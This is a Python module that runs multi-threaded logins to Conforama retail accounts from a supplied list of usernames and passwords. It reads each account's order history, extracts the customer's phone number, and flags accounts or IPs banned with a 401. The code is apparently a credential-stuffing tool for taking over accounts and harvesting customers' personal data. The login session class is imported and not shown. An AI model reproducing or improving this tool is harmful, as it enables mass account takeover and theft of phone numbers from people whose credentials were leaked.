"""
Phone Extractor Module
Handles the phone number extraction process for accounts
"""

import threading
from typing import Optional, Callable, List, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

from conforama_session import ConforamaSession


class PhoneResult:
    """Result object for phone extraction"""
    def __init__(self, username: str, password: str = "", phone: Optional[str] = None, 
                 success: bool = False, error: Optional[str] = None, banned: bool = False):
        self.username = username
        self.password = password
        self.phone = phone
        self.success = success
        self.error = error
        self.banned = banned
        self.timestamp = time.time()


class PhoneExtractor:
    """Handles phone number extraction with threading support"""
    
    def __init__(self, max_workers: int = 3, callback: Optional[Callable] = None):
        self.max_workers = max_workers
        self.callback = callback
        self.results: List[PhoneResult] = []
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
    
    def process_single_account(self, username: str, password: str) -> PhoneResult:
        """Process a single account and extract phone number"""
        if self.stop_event.is_set():
            return PhoneResult(username, password, error="Process stopped")
        
        try:
            with ConforamaSession() as session:
                # Step 1: Load login page
                login_result = session.get_login_page()
                if login_result == "banned":
                    return PhoneResult(username, password, error="IP/Account banned (401)", banned=True)
                if not login_result:
                    return PhoneResult(username, password, error="Failed to load login page")
                
                # Step 2: Perform login
                login_result = session.perform_login(username, password)
                if login_result == "banned":
                    return PhoneResult(username, password, error="IP/Account banned (401)", banned=True)
                if not login_result:
                    return PhoneResult(username, password, error="Login failed")
                
                # Step 3: Access order history
                order_result = session.get_order_history()
                if order_result == "banned":
                    return PhoneResult(username, password, error="IP/Account banned (401)", banned=True)
                if not order_result:
                    return PhoneResult(username, password, error="Failed to access order history")
                
                # Step 4: Get phone number from address page
                phone = session.get_customer_address()
                
                if phone == "banned":
                    return PhoneResult(username, password, error="IP/Account banned (401)", banned=True)
                elif phone:
                    result = PhoneResult(username, password, phone=phone, success=True)
                    return result
                else:
                    return PhoneResult(username, password, error="No phone number found")
        
        except Exception as e:
            return PhoneResult(username, password, error=f"Exception: {str(e)}")
    
    def process_accounts_threaded(self, credentials: List[Tuple[str, str]]) -> List[PhoneResult]:
        """Process multiple accounts using threading"""
        results = []
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            # Submit all tasks
            future_to_account = {
                executor.submit(self.process_single_account, username, password): username
                for username, password in credentials
            }
            
            # Process completed tasks
            for future in as_completed(future_to_account):
                if self.stop_event.is_set():
                    break
                    
                username = future_to_account[future]
                try:
                    result = future.result()
                    results.append(result)
                    
                    # Call callback if provided
                    if self.callback:
                        self.callback(result, len(results), len(credentials))
                        
                except Exception as e:
                    # Get password from credentials
                    password = next((pwd for user, pwd in credentials if user == username), "")
                    result = PhoneResult(username, password, error=f"Future exception: {str(e)}")
                    results.append(result)
                    
                    if self.callback:
                        self.callback(result, len(results), len(credentials))
        
        return results
    
    def process_accounts_sequential(self, credentials: List[Tuple[str, str]]) -> List[PhoneResult]:
        """Process accounts sequentially (for debugging)"""
        results = []
        
        for i, (username, password) in enumerate(credentials, 1):
            if self.stop_event.is_set():
                break
            
            result = self.process_single_account(username, password)
            results.append(result)
            
            # Call callback if provided
            if self.callback:
                self.callback(result, i, len(credentials))
        
        return results
    
    def stop(self):
        """Stop the extraction process"""
        self.stop_event.set()
    
    def reset(self):
        """Reset the extractor for new run"""
        self.stop_event.clear()
        self.results.clear()
